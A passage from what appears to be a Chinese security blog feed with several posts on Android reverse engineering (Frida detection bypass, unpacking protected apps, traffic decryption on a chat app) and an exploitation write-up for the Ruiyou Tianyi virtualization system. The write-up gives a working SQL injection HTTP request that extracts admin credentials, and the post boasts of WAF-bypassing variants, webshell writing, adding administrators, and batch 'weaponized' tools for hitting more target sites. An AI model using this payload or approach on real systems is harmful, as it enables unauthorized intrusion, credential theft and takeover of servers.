这明显是防止attach的错误。我们在测试spwn 也报错 Bad access due to invalid address </li><pre class="language-none"><code class="language-none">0x776d5708dc &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;libart.so0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8aProcess crashed: Bad access due to invalid address****** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***Build fingerprint: &#39;google&#x2F;sailfish&#x2F;sailfish:10&#x2F;QP1A.191005.007.A3&#x2F;5972272:user&#x2F;release-keys&#39;Revision: &#39;0&#39;ABI: &#39;arm64&#39;Timestamp: 2023-04-17 16:01:22+0800pid: 24218, tid: 24218, name: etease.nim.avic  &gt;&gt;&gt; com.netease.nim.avic &lt;&lt;&lt;uid: 10202signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x76fa500000    x0  00000076fa500000  x1  0000000000000000  x2  0000000000021000  x3  00000076fa500000    x4  00000076fa521000  x5  0000000000000001  x6  0000000000000000  x7  000000000000d000    x8  00000077f3bb2ed0  x9  0000000000021000  x10 884a5413cd36b29d  x11 5851f42d4c957f2d    x12 14057b7ef767814f  x13 000000000000c000  x14 00000077f14f7000  x15 ff51afd7ed558ccd    x16 00000077f15c68d8  x17 00000077f15537c0  x18 00000077f389c000  x19 0000000000021000    x20 00000076fa500000  x21 0000007fed9cf504  x22 0000007fed9cf49c  x23 000000776dc025f8    x24 00000077f2615430  x25 0000000000000040  x26 000000776dc2ddc0  x27 000000776dc2d0c0    x28 000000776dc00980  x29 0000007fed9cf420    sp  0000007fed9cf190  lr  00000077f153cbdc  pc  00000077f155384cbacktrace:      #00 pc 000000000007e84c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (memset+140) (BuildId: 5812256023147338b8a9538321d4c456)      #01 pc 0000000000067bd8  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (extent_recycle+3672) (BuildId: 5812256023147338b8a9538321d4c456)      #02 pc 0000000000066d70  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_extents_alloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #03 pc 000000000004e8c0  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_arena_extent_alloc_large+152) (BuildId: 5812256023147338b8a9538321d4c456)      #04 pc 000000000006c49c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_large_palloc+512) (BuildId: 5812256023147338b8a9538321d4c456)      #05 pc 0000000000046b00  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_calloc+2508) (BuildId: 5812256023147338b8a9538321d4c456)      #06 pc 0000000000040264  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (calloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #07 pc 00000000000a5a20  &#x2F;data&#x2F;app&#x2F;com.netease.nim.avic-l9CVU6oTzmoWP9co9LC-iA&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libKwProtectSDK.so (BuildId: ece12da60a11f31e9398bb91bf127ba9dd122b75)      #08 pc 0000000000050cf8  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZL10call_arrayIPFviPPcS1_EEvPKcPT_mbS5_+276) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #09 pc 0000000000050f14  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZN6soinfo17call_constructorsEv+376) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #10 pc 000000000003c970  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__Z9do_dlopenPKciPK17android_dlextinfoPKv+2416) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #11 pc 00000000000380dc  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__loader_android_dlopen_ext+72) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #12 pc 00000000000011d0  &lt;anonymous:7764f58000&gt;</code></pre><li>测试加载libKwProtectSDK.so 软件奔溃了。这里有两种可能一种是检测frida了  另一种是frida版本不兼容报无效访问地址。通过我的测试发现 是frida版本不稳定的原因 要多次spwn才可以正常运行。或者降低frida版本。所以遇到错误要多测试几次要不真以为spwn检测frida。但是在attach模式下是会检测的所以我们也要多次测试保证frida先于app attach上!!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181615684.png" alt="正常运行了"></p></ul><h2 id="几维安全加固的特征脱壳演示"><a href="#几维安全加固的特征脱壳演示" class="headerlink" title="几维安全加固的特征脱壳演示"></a>几维安全加固的特征脱壳演示</h2><ul><li>在lib目录里有有libKwProtectSDK.so 。在assets 目录里面有 kadp_arm64-v8a。此外这个版本是整体加固所以我们使用 葫芦娃大佬的frida-dexdump进行脱壳</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181628134.png" alt="几维安全加固特征"></p><li>脱壳演示<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181631629.png" alt="脱壳成功接下来就是分析"></p></ul><h2 id="frida-hook脚本定位检测点"><a href="#frida-hook脚本定位检测点" class="headerlink" title="frida hook脚本定位检测点"></a>frida hook脚本定位检测点</h2><ul><li>定位root检测点</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181642221.png" alt="定位root检测点"></p><li>使用我们的脚本可能由于我们的脚本检测不全所以也弹出框。所以我们直接编写hook 检测函数的脚本直接上。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181650219.png" alt="过掉root检测"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>(1)遇到app奔溃的时候多测试几次或者换一个版本低点的进行测试</li><li>(2)多自己写点常用检测定的脚本方便定位</li><li>(3)在frida hook时候我们必须要熟练掌握常用hook api和javase基础才能够好的学习app</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>瑞友天翼应用虚拟化系统sql注入导致代码执行漏洞复现</title>
      <link href="/penetrationtest/2023/04/articles/5d3d24785f2881ff/"/>
      <url>/penetrationtest/2023/04/articles/5d3d24785f2881ff/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="瑞友天翼应用虚拟化系统介绍"><a href="#瑞友天翼应用虚拟化系统介绍" class="headerlink" title="瑞友天翼应用虚拟化系统介绍"></a>瑞友天翼应用虚拟化系统介绍</h1><ul><li>瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。操作终端无需再安装应用程序，通过天翼独特的RAP 协议（Remote Application Protocol），即可让用户快速访问服务器上的各类应用软件；天翼RAP 协议只传输鼠标、键盘及屏幕变化的矢量数据，访问仅需3KB/s（20kbps）的带宽，用户不再受客户端和连接性能要求的限制，在任何时间、任何地点，利用任何设备、任何网络连接方式，即可高效安全地访问服务器（群）上的应用程序和关键资源</li></ul><h2 id="系统界面"><a href="#系统界面" class="headerlink" title="系统界面"></a>系统界面</h2><ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151452516.png" alt="主页见面"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151453050.png" alt="管理员界面"></p></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>sql注入漏洞复现截图</li>sql注入简单payload给你们截图放出来了<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151455681.png" alt="sql注入"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>Index<span class="token operator">/</span>dologin <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span><span class="token literal-property property">Host</span><span class="token operator">:</span> www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comCache<span class="token operator">-</span>Control<span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token operator">:</span> <span class="token number">1</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comUser<span class="token operator">-</span>Agent<span class="token operator">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token constant">WOW64</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">108.0</span><span class="token number">.5359</span><span class="token number">.95</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token literal-property property">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://www.testcms.com/Accept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=qaq1si606l62k871g450g46n01; CookieLanguageName=ZH-CNConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 132name=adminasdfdsfd') and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,`name`,0x3a,pwd,0x23) FROM cuser limit 0,1),0x7e),1)#</span></code></pre><li>sql注入写文件 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151502987.png" alt="shell脚本"></p><li>sql注入接口通杀 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151504432.png" alt="通杀"></p><li>直接添加管理员</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151507700.png" alt="管理员添加用户"></p></ul><h2 id="实战最新版本过阿里云waf-getshell"><a href="#实战最新版本过阿里云waf-getshell" class="headerlink" title="实战最新版本过阿里云waf  getshell"></a>实战最新版本过阿里云waf  getshell</h2><ul><li><p>使用我们的变形sql注入exp 通杀最新版  直接getshell。我们的工具不光是用别人现成的exp直接集成而是经过我们加工使他能够绕过waf。来获取更多目标网站。从而扩大战果。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151926857.png" alt="实战getshell"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151940176.png" alt="实战添加管理员"></p></li></ul><h2 id="瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图"><a href="#瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图" class="headerlink" title="瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图"></a>瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图</h2><p>详情请看:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304161951372.png" alt="集成批量武器化7.x"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181420304.png" alt="集成批量武器化6.x"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><ul><li>最近挺火的瑞友天翼应用虚拟化系统远程代码执行漏洞。本来不打算搞了。各种公众号马赛克只讲代码审计。没有exp这能行。直接日他说这些。要不说群主水平存在问题。这个只要知道路径。并且有php接口。复现应该通杀。 后续集成到软件。网马采用自写的冰蝎免杀一句话 。十六进制编码方式。sql注入的过waf的变形exp。以后内部群$给到位的。我能分析能复现的漏洞和漏洞原理 调试文件直接 发到群里。授人以鱼不如授人以渔😏 。另外比接口可以直接添加管理员😏。主要是源码难找漏洞不难。情报链接 https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog</li></ul><h2 id="关于复现漏洞计划"><a href="#关于复现漏洞计划" class="headerlink" title="关于复现漏洞计划"></a>关于复现漏洞计划</h2><ul><li>后续有复现的漏洞有时间全部集成到我们的批量自动化工具里面。让它变成很牛逼的工具。相信我们集成exp都是自己的免杀网马和过waf的 exp。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>okhttp3框架frida hook脚本-原创</title>
      <link href="/androidreverse/2023/04/articles/1680858695738790/"/>
      <url>/androidreverse/2023/04/articles/1680858695738790/</url>
      
        <content type="html"><![CDATA[<h1 id="okhttp3-框架介绍"><a href="#okhttp3-框架介绍" class="headerlink" title="okhttp3 框架介绍"></a>okhttp3 框架介绍</h1> <ul><li>android网络框架之OKhttp一个处理网络请求的开源项目,是安卓端最火热的轻量级框架。编写这个脚本的目的是现在多数app试用okhttp3 进行请求 所以我们可以看请求的参数通过这个脚本以后</li></ul><h2 id="脚本界面截图"><a href="#脚本界面截图" class="headerlink" title="脚本界面截图"></a>脚本界面截图</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071729860.png" alt="脚本界面截图"></p><h2 id="hook脚本演示"><a href="#hook脚本演示" class="headerlink" title="hook脚本演示"></a>hook脚本演示</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071732636.png" alt="hook脚本演示"></p><h2 id="是否博主原创"><a href="#是否博主原创" class="headerlink" title="是否博主原创"></a>是否博主原创</h2><pre><code> <pre class="language-none"><code class="language-none">是</code></pre></code></pre><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/136</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爱加密企业版脱壳-方法(依赖定制系统)</title>
      <link href="/androidreverse/2023/03/articles/bb06c9f5435cf86a/"/>
      <url>/androidreverse/2023/03/articles/bb06c9f5435cf86a/</url>
      
        <content type="html"><![CDATA[<h2 id="加固类型"><a href="#加固类型" class="headerlink" title="加固类型"></a>加固类型</h2><ul><li> 整体加固:个人理解 把核心dex加密静态的时候看的是壳子的dex。等app启动的时候通过壳子的dex解密并且运行在内存中运行dex</li><li> 抽取加固:个人理解 把类中的方法体抽空,如果用到这个方法的时候然后回填到方法体中调用完毕以后再次抽空改方法体。</li><li> 要对付这这种抽取加固我们要把类里面的所有方法进行主动调用调用完毕以后在保存dex。大部分时候需要修复dex 为啥要修复 你方法体抽空以后回填的时候总要对每个方法名称和方法体做标记要不你咋知道哪个是那个方法对吧。所以要进行修复使其对应。当然这种需要阅读安卓系统源码找到加载dex的函数。和能可以主动调用合适的函数。然后修改系统源代码编译成系统刷机。</li></ul> <h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul><li>查壳是否是安卓报错</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310937812.png" alt="查壳是否是安卓"></p><li>看一下app结构发现是uni-app对于这种发包请求加密可能在js层。发包可能在java层。这种用java层算法定位可能定位不了。当然这种也可以调试一下这不是我们的重点我们是要演示脱壳修复</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310942915.png" alt="查壳app特性发现是uni-app"></p><li>postern+Charles抓包看看请求是否加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310949226.png" alt="请求加密了"></p></ul><h2 id="算法定位"><a href="#算法定位" class="headerlink" title="算法定位"></a>算法定位</h2><ul><li>frida 先尝试一java算法定位,可以看到被检测到了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310953552.png" alt="被检测"></p><li>过firda 检测演示 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310957936.png" alt="过firda检测"></p><li>使用java通杀算法定位一下,aes算法。当然用其他函数也可以定位我就不演示了 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311000487.png" alt="已经定位到"></p><li>使用jadx查找关键函数。查询不到。要不是混淆要不就是加壳了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311003476.png" alt="搜索不到关键函数"></p><li>查壳爱加密企业版利用之前的脱壳工具frida-dexdump 没有脱掉,blackdex直接闪退。所以我们要使用定制系统进行脱壳当然这也不是万能的!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311005627.png" alt="爱加密企业版"></p></ul><h2 id="使用定制系统进行脱壳演示"><a href="#使用定制系统进行脱壳演示" class="headerlink" title="使用定制系统进行脱壳演示"></a>使用定制系统进行脱壳演示</h2><ul><li>先把app安卓到定制系统上然后直接启动app脱壳完毕以后会在指定目录下生成dex文件。当然如果你不用frida 过检测那么你用脱壳系统也会奔溃导致无法脱壳所以。我们需要使用脱壳系统和frida进行配合才可以进行脱壳。脱壳后的结果</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311014905.png" alt="脱壳后的结果"></p><li>脱壳修复 java -jar dexfixer.jar baidu.dex baid.bin baidu.dex 修复后把所有dex打包zip拖到jadx里面 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311017779.png" alt="修复后打包zip"></p></ul><h2 id="脱壳修复后搜索关键函数"><a href="#脱壳修复后搜索关键函数" class="headerlink" title="脱壳修复后搜索关键函数"></a>脱壳修复后搜索关键函数</h2><ul><li>搜索关键函数搜索到了和我们java hook定位一样</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311021787.png" alt="搜索函数"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>脱壳系统打造需要对安卓系统和前辈们的脱壳代码和脱壳点进行深入研究。查找更深入的脱壳点这需要花费大量时间和精力去研究。不是一蹴而就的我现在只能照猫画虎还完全不是很理解各个脱壳点的。当然我们渗透测试人员对于这种会点原理会使用工具就行了。我们不是专业的安卓逆向工程师。</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓自动化加解密渗透测试工具autoDecoder-实战演示某聊聊天app获取任意用户手机号</title>
      <link href="/androidreverse/2023/03/articles/85d078fd29af3d21/"/>
      <url>/androidreverse/2023/03/articles/85d078fd29af3d21/</url>
      
        <content type="html"><![CDATA[<h2 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h2><ul><li>Burp插件，根据自定义来达到对数据包的处理（适用于加解密、爆破等），类似mitmproxy，不同点在于经过了burp中转，在自动加解密的基础上，不影响APP、网站加解密正常逻辑等。<br/>官方地址:https://github.com/f0ng/autoDecoder<br/><p>个人理解:在安卓app请求整体被加密了以后用这个很方便下面例子说明</p></li></ul><h2 id="对测试app进行分析"><a href="#对测试app进行分析" class="headerlink" title="对测试app进行分析"></a>对测试app进行分析</h2><ul><li>使用jadx进行反编看看这个apk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161014176.png" alt="jadx查看"><br>从上面看不出这个app是什么加固一看是MyApplication 肯定是加固过的</p><li>使用查看工具看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161020007.png" alt="发现使用网易易盾进行加加固"></p><li>安装app到手机并且进行抓包</li>   找个可用的手机号验证码注册然后设置密码用账号密码登陆这个app。我已经注册并且设置把密码设置好了。你们自行设置。由于这个app处于运行状态涉及到敏感的地方直接打码如果后续你们遇到的话可以尝试一下。这次测试在于掌握autodecoder插件的使用其他东西我直接略过将讲解一下。想要了解详细的步骤过程后续会在飞机内部群里面讲解如果有人对博客发布文章想要详细步骤什么的。废话不多说开始抓包了。   <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161037237.png" alt="抓包详情"><br>通过抓包可以看到数据加密传输。一开始想用frida自吐算法搞一波说干就干。启动frida server。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161041203.png" alt="附加frida直接奔溃"></p><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">932</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _bootstrap_inner    self<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">870</span><span class="token punctuation">,</span> <span class="token keyword">in</span> run    self<span class="token punctuation">.</span>_target<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>_kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">796</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _run    work<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">394</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _try_start    self<span class="token punctuation">.</span>_start<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">139</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _start    self<span class="token punctuation">.</span>_set_autoperform<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_autoperform_option<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">472</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _set_autoperform    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_is_java_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">479</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _is_java_available    script <span class="token operator">=</span> self<span class="token punctuation">.</span>_session<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"java_check"</span><span class="token punctuation">,</span> source<span class="token operator">=</span><span class="token string">"rpc.exports.javaAvailable = () => Java.available;"</span><span class="token punctuation">,</span> runtime<span class="token operator">=</span>self<span class="token punctuation">.</span>_runtime<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">26</span><span class="token punctuation">,</span> <span class="token keyword">in</span> wrapper    <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">262</span><span class="token punctuation">,</span> <span class="token keyword">in</span> create_script    <span class="token keyword">return</span> Script<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_impl<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">)</span>frida<span class="token punctuation">.</span>TransportError<span class="token punctuation">:</span> the connection <span class="token keyword">is</span> closed</code></pre><p>我们看sapwn的方式 使用命令frida-ps -Ua  查看包名画红线框的这个就是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161044636.png" alt="使用命令查看目标app的包名"><br>接下来使用包名启动firda 直接等一会进程就退出了。猜测此肯定检测了frida。并且可能在so层检测。所以我们就要干掉frida检测使用葫芦娃大佬修改版的frida。减少了frida特征但是还是会被检测。思考检测肯定在某个so文件里面的某些个函数进行检测。所以我们通过这个思路可以bypass 对frida的检测干掉检测函数即可。猜测检测可能是网易易盾对frida的检测。本身app代码检测的概率很少。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161046159.png" alt="spawn"></p></ul><h2 id="编写frida-bypass脚本对抗frida检测"><a href="#编写frida-bypass脚本对抗frida检测" class="headerlink" title="编写frida bypass脚本对抗frida检测"></a>编写frida bypass脚本对抗frida检测</h2><ul><li>由于网络某些地方都没有公开放出来检测代码这里仅仅演示bypass效果</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161055081.png" alt="bypass网易易盾的frida检测"></p></ul><h2 id="使用自吐算法脚本定位算法细节"><a href="#使用自吐算法脚本定位算法细节" class="headerlink" title="使用自吐算法脚本定位算法细节"></a>使用自吐算法脚本定位算法细节</h2><ul><li>随便输入一个不存在的手机号显示账号不存在我们配合包就行查找<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161101292.png" alt="通杀算法脚本"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161104707.png" alt="可以看到定位到了加密前的我们提交的数据密文明文上面有我没有截图"><br>放出堆栈信息</p><pre class="language-java" data-language="java"><div class="caption"><span>堆栈信息</span></div><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>at <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>at com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span 